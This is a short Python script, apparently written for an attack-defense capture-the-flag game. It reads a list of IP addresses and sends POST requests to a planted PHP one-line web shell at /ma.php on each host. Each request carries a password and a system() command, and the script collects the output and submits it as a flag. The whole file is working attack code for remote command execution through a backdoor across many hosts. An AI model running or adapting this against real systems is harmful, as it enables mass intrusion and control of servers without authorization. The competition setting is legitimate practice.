import requests
import AttackMethod  
success_sign = "[+ success +]"
error_sign = "[- error   -]"

def createiplist( filename ) : 
    """ 构建ip列表 """
    ip_list = []
    # ip:port列表文件
    ip_file = open(filename) 
    ip_lines = ip_file.readlines()
    for i in ip_lines :
        if i != "\n" :
            ip_list.append( i.rstrip() )
    return ip_list
      
def attack( ip_list , target) :
    """ 批量攻击不死马函数 """
    error_list = []
    for i in ip_list:
        try : 
            # 执行指令
            datas = {"pass":"hbu","a":'system("echo flag{nsn}");'} #这里需要改一下获取flag的ip
            # 发送恶意请求
            r = requests.post('http://'+i+target,timeout=0.3,data=datas)
            # 设置编码
            r.encoding = "utf-8"
            # 回显的报文
            # print(r.text) 
            # flag需要自己处理
            flag = {"flag":r.text.rstrip() }
            #自动提交flag
            headers = {"Cookies":"ID=233;"}
            AttackMethod.subflag(i , flag , "http://127.0.0.1/submitFlag.php", headers , "JSON")
        except : 
            error_list.append("[- error   -] " + i)
            pass
    for i in error_list : 
            print(i)

# 生成ip列表
ip_list = createiplist("/Users/h3zh1/Desktop/自写awd/lastest_ip.txt")
# 一句话木马地址
target = "/ma.php"
# 攻击
attack( ip_list ,target )
